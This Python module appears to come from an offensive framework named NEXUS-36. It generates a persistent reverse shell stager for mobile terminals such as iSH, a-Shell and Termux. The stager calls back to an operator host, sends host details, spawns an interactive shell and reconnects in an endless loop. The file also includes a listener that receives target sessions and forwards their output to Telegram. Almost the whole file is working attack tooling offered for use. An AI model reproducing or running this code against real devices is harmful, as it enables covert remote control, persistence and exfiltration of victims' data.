#!/usr/bin/env python3
"""
NEXUS-36 — MOBILE C2 STAGER & PERSISTENT EVENT LISTENER
Module: C2_DEPLOYER
Version: 8.0 — Offensive Red Team Callback, Telegram Telemetry & Event Listener Engine

Responsibilities:
- Generates resilient, persistent Python reverse shell stagers with heartbeat telemetry for mobile execution (iSH, a-Shell, Termux).
- Performs pre-deployment socket verification against operator listener nodes.
- Exfiltrates stager artifacts and execution telemetry to persistent storage and Telegram.
- Includes a built-in asynchronous event listener mode to capture target feedback post-exploitation.

Python 3.9+
"""

from __future__ import annotations

import os
import sys
import socket
import time
import json
import asyncio
from pathlib import Path
from datetime import datetime, timezone

# Import centralized Telegram broadcaster for post-attack feedback & alerts
try:
    from modules.telegram_notifier import send_telegram_alert
except ImportError:
    async def send_telegram_alert(*args, **kwargs): pass

MODULE = "C2_DEPLOYER"
VERSION = "8.0"

BASE_DIR = Path(__file__).resolve().parent.parent
PAYLOAD_DIR = BASE_DIR / "reports" / "payloads"
EVIDENCE_DIR = BASE_DIR / "nexus_evidence"


def timestamp():
    return datetime.now(timezone.utc).isoformat()


def broadcast_tg_alert_sync(loot_type, details):
    """Helper to non-blockingly fire Telegram alerts from synchronous listener functions."""
    try:
        loop = asyncio.get_running_loop()
        loop.create_task(send_telegram_alert(loot_type, details))
    except RuntimeError:
        try:
            asyncio.run(send_telegram_alert(loot_type, details))
        except Exception:
            pass


def generate_python_reverse_shell_stager(listener_ip: str, listener_port: int) -> str:
    """
    Generates an elite, resilient Python reverse shell stager engineered for 
    mobile execution environments (iSH, a-Shell, Termux) featuring automatic 
    shell resolution, persistent heartbeat reconnection, and telemetry exfiltration.
    """
    stager_code = f'''# NEXUS-36 Elite Mobile C2 Reverse Shell Stager (Persistent Telemetry Edition)
import socket, subprocess, os, sys, platform, time

def resolve_mobile_shell():
    """Dynamically resolves available shell binaries in restricted environments."""
    for candidate in ["/bin/bash", "/bin/sh", "/system/bin/sh", "sh"]:
        if os.path.exists(candidate) or candidate == "sh":
            return candidate
    return "sh"

def spawn_c2_shell():
    HOST = "{listener_ip}"
    PORT = {listener_port}
    
    # Infinite reconnection loop for persistent post-attack feedback
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            
            # Send initial comprehensive host telemetry handshake
            telemetry = f"[+] PERSISTENT HANDSHAKE // OS: {{platform.system()}} {{platform.release()}} // Node: {{platform.node()}} // User: {{os.getenv('USER', 'unknown')}}\\n"
            s.sendall(telemetry.encode("utf-8"))
            
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            
            shell_bin = resolve_mobile_shell()
            subprocess.call([shell_bin, "-i"])
        except Exception:
            # Sleep and attempt reconnection to ensure persistent post-attack feedback
            time.sleep(10)

if __name__ == "__main__":
    spawn_c2_shell()
'''
    PAYLOAD_DIR.mkdir(parents=True, exist_ok=True)
    payload_path = PAYLOAD_DIR / "c2_stager.py"
    payload_path.write_text(stager_code, encoding="utf-8")
    return str(payload_path)


def verify_listener_socket(listener_ip: str, listener_port: int, timeout: float = 2.0) -> bool:
    """
    Actively checks if the operator listener node is listening on the specified port 
    before declaring stager deployment successful.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((listener_ip, listener_port))
        s.close()
        return result == 0
    except Exception:
        return False


async def start_async_event_listener(listener_ip: str, listener_port: int):
    """
    Asynchronous event listener that catches target callbacks, records session telemetry,
    persists forensic feedback to disk, and broadcasts unredacted logs directly to Telegram.
    """
    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
    server = await asyncio.start_server(handle_target_connection, "0.0.0.0", listener_port)
    print(f"\n\033[92m[+++] ASYNC EVENT LISTENER ACTIVE on 0.0.0.0:{listener_port} [+++]\033[0m")
    print(f"[*] Awaiting target callbacks and post-attack feedback streams...\n")
    
    async with server:
        await server.serve_forever()


async def handle_target_connection(reader, writer):
    peername = writer.get_extra_info('peername')
    print(f"\n\033[91m[***] INCOMING TARGET CONNECTION CONFIRMED: {peername} [***]\033[0m")
    
    session_id = f"session_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')}"
    session_log = []

    try:
        while True:
            data = await reader.read(4096)
            if not data:
                break
            chunk = data.decode("utf-8", errors="replace")
            sys.stdout.write(chunk)
            sys.stdout.flush()
            session_log.append(chunk)

            # Broadcast incoming target feedback instantly to Telegram
            broadcast_tg_alert_sync(f"C2 Target Feedback [{peername[0]}]", {"snippet": chunk[:500]})
            
    except Exception as exc:
        print(f"\n[-] Target connection error ({peername}): {exc}")
    finally:
        writer.close()
        await writer.wait_closed()
        print(f"\n[-] Target session closed: {peername}")

        # Persist complete session feedback to immutable storage
        evidence_file = EVIDENCE_DIR / f"c2_session_{session_id}.json"
        record = {
            "session_id": session_id,
            "target_ip": peername[0] if peername else "unknown",
            "timestamp": timestamp(),
            "feedback_log": "".join(session_log)
        }
        evidence_file.write_text(json.dumps(record, indent=4), encoding="utf-8")
        print(f"[+] Session telemetry and feedback persisted to: {evidence_file}")


def deploy_c2_stager(listener_ip: str = "10.0.0.5", listener_port: int = 4444) -> str:
    """Compiles stager payload and verifies operator listener status."""
    print(f"\n\033[95m[{MODULE}] INITIALIZING ELITE C2 CALLBACK STAGER MODULE\033[0m")
    path = generate_python_reverse_shell_stager(listener_ip, listener_port)
    
    listener_active = verify_listener_socket(listener_ip, listener_port)
    
    print(f" \033[92m[+] Mobile C2 Stager compiled successfully -> Saved to: {path}\033[0m")
    if listener_active:
        print(f" \033[92m[+++] LISTENER VERIFIED: Active listener detected on {listener_ip}:{listener_port}!\033[0m")
    else:
        print(f" \033[93m[!] WARNING: No active listener detected on {listener_ip}:{listener_port}.\033[0m")
        
    print(f" \033[93m[*] Operator Listener Instructions:\033[0m")
    print(f"     1. Run async event listener: python3 payload.py --listen --port {listener_port}")
    print(f"     2. Execute stager on target/mobile terminal: python3 {path}\n")

    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
    evidence_record = {
        "module": MODULE,
        "version": VERSION,
        "timestamp": timestamp(),
        "listener_ip": listener_ip,
        "listener_port": listener_port,
        "listener_active": listener_active,
        "payload_path": path
    }
    evidence_file = EVIDENCE_DIR / f"c2_deploy_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')}.json"
    evidence_file.write_text(json.dumps(evidence_record, indent=4), encoding="utf-8")

    return path


# -------------------------------------------------------------
# ENGINE-COMPATIBLE ENTRY POINT
# -------------------------------------------------------------

async def run_c2_deployer(
    cognitive_operator=None,
    listener_ip="10.0.0.5",
    listener_port=4444,
    listen=False,
    **kwargs
):
    if cognitive_operator and isinstance(cognitive_operator, str) and "." in cognitive_operator:
        listener_ip = cognitive_operator

    if listen:
        await start_async_event_listener(listener_ip, listener_port)
    else:
        return await asyncio.to_thread(deploy_c2_stager, listener_ip, listener_port)


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="NEXUS-36 Mobile C2 Deployer & Event Listener")
    parser.add_argument("--ip", default="10.0.0.5", help="Listener IP address")
    parser.add_argument("--port", type=int, default=4444, help="Listener Port")
    parser.add_argument("--listen", action="store_true", help="Start asynchronous event listener mode")
    args = parser.parse_args()

    if args.listen:
        asyncio.run(start_async_event_listener(args.ip, args.port))
    else:
        deploy_c2_stager(args.ip, args.port)
